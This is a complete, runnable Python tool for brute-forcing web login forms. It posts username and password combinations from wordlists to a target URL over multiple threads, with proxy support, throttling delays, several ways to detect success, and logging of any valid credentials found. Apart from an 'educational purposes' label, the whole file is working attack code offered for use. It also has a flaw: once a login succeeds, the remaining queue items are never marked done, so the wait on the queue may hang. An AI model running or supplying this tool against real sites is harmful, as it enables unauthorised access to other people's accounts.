#!/usr/bin/env python3
"""
Enhanced Web Login Brute‑Force Tool
Based on nandharjpm's Web-Login-Bruteforce
Added features: threading, proxies, delay, flexible detection, logging, colors
Author: Modified for educational purposes
Repo: https://github.com/nandharjpm/Web-Login-Bruteforce
"""

import requests
import argparse
import sys
import threading
import time
import logging
from queue import Queue
from urllib.parse import urljoin

# Optional: color output
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    COLORS = True
except ImportError:
    COLORS = False
    class Fore:
        RED = GREEN = YELLOW = CYAN = RESET = ''
    Style = type('', (), {'RESET_ALL': ''})()

# ------------------- Argument Parsing -------------------
parser = argparse.ArgumentParser(description="Enhanced Web Login Brute‑Force Tool")
parser.add_argument("-u", "--url", required=True, help="Target login URL")
parser.add_argument("-U", "--userlist", help="File with usernames (one per line)")
parser.add_argument("-p", "--passwordlist", help="File with passwords (one per line)")
parser.add_argument("--user", help="Single username (if not using a list)")
parser.add_argument("--password", help="Single password (if not using a list)")
parser.add_argument("--user-field", default="username", help="Username field name (default: username)")
parser.add_argument("--pass-field", default="password", help="Password field name (default: password)")
parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads (default: 5)")
parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between attempts per thread (seconds)")
parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
parser.add_argument("--timeout", type=int, default=10, help="Request timeout (seconds)")
parser.add_argument("--detect", choices=["text", "status", "redirect"], default="text",
                    help="Detection method: text, status, or redirect")
parser.add_argument("--success-text", default="Welcome", help="Text that indicates success (for text detection)")
parser.add_argument("--success-status", type=int, default=302, help="Status code that indicates success")
parser.add_argument("--success-redirect", default="/dashboard", help="URL fragment after redirect")
parser.add_argument("-o", "--output", help="File to save successful credentials")
parser.add_argument("--log", help="Log file for all attempts (optional)")
parser.add_argument("--verbose", action="store_true", help="Print each attempt")
args = parser.parse_args()

# ------------------- Validation -------------------
if not args.userlist and not args.user:
    parser.error("Either --userlist or --user must be provided")
if not args.passwordlist and not args.password:
    parser.error("Either --passwordlist or --password must be provided")

# Load wordlists
def load_wordlist(file_path):
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] File not found: {file_path}{Style.RESET_ALL}")
        sys.exit(1)

usernames = [args.user] if args.user else load_wordlist(args.userlist)
passwords = [args.password] if args.password else load_wordlist(args.passwordlist)

print(f"{Fore.CYAN}[*] Loaded {len(usernames)} usernames and {len(passwords)} passwords.{Style.RESET_ALL}")

# ------------------- Setup -------------------
# Session with optional proxy
session = requests.Session()
if args.proxy:
    session.proxies = {
        "http": args.proxy,
        "https": args.proxy
    }
    print(f"{Fore.CYAN}[*] Using proxy: {args.proxy}{Style.RESET_ALL}")

# Setup logging
if args.log:
    logging.basicConfig(filename=args.log, level=logging.INFO,
                        format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
    log_to_file = logging.getLogger()
else:
    log_to_file = None

# Queue for work items
work_queue = Queue()
for user in usernames:
    for pwd in passwords:
        work_queue.put((user, pwd))

total_attempts = len(usernames) * len(passwords)
lock = threading.Lock()
found = False
found_credentials = None

# ------------------- Detection Function -------------------
def is_success(response, final_url):
    if args.detect == "text":
        return args.success_text in response.text
    elif args.detect == "status":
        return response.status_code == args.success_status
    elif args.detect == "redirect":
        return args.success_redirect in final_url
    return False

# ------------------- Worker Function -------------------
def worker():
    global found, found_credentials
    while not found and not work_queue.empty():
        try:
            user, pwd = work_queue.get(timeout=1)
        except:
            break

        if found:
            break

        # Prepare POST data
        data = {
            args.user_field: user,
            args.pass_field: pwd
        }

        if args.verbose:
            print(f"{Fore.YELLOW}[*] Trying {user}:{pwd}{Style.RESET_ALL}")

        try:
            response = session.post(args.url, data=data, timeout=args.timeout, allow_redirects=True)
        except requests.exceptions.RequestException as e:
            if args.verbose:
                print(f"{Fore.RED}  Connection error: {e}{Style.RESET_ALL}")
            if log_to_file:
                log_to_file.info(f"ERROR {user}:{pwd} - {e}")
            work_queue.task_done()
            continue

        # Determine success
        success = is_success(response, response.url)

        if success:
            with lock:
                if not found:
                    found = True
                    found_credentials = (user, pwd)
                    print(f"\n{Fore.GREEN}[+] SUCCESS! Valid credentials: {user}:{pwd}{Style.RESET_ALL}")
                    if args.output:
                        with open(args.output, "a") as f:
                            f.write(f"{user}:{pwd}\n")
                    if log_to_file:
                        log_to_file.info(f"SUCCESS {user}:{pwd}")
        else:
            if log_to_file and args.verbose:
                log_to_file.info(f"FAIL {user}:{pwd} - {response.status_code}")

        # Optional delay
        if args.delay > 0:
            time.sleep(args.delay)

        work_queue.task_done()

# ------------------- Run Threads -------------------
print(f"{Fore.CYAN}[*] Starting attack with {args.threads} threads...{Style.RESET_ALL}")
start_time = time.time()

threads = []
for _ in range(args.threads):
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

# Wait for all tasks to finish
work_queue.join()

# Stop any remaining threads
for t in threads:
    t.join()

end_time = time.time()
print(f"{Fore.CYAN}[*] Completed in {end_time - start_time:.2f} seconds{Style.RESET_ALL}")

if not found:
    print(f"{Fore.RED}[!] No valid credentials found.{Style.RESET_ALL}")
else:
    print(f"{Fore.GREEN}[+] Credentials saved to {args.output if args.output else 'stdout'}{Style.RESET_ALL}")
